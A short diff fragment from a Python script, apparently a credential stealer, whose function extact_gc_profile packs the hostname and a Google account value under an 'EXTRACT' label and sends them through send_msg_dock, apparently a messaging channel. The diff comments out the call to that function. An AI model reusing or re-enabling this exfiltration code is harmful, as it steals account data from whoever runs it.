@@ -84,7 +84,7 @@ def extact_gc_profile():
 	mssgg_tel=" [ "+hostname_os +" ] \n [ EXTRACT ] [ "+g00g_acc +" ]"
 	send_msg_dock(mssgg_tel)
 
-extact_gc_profile()
+# extact_gc_profile()
 
 
 print(pofile_path)
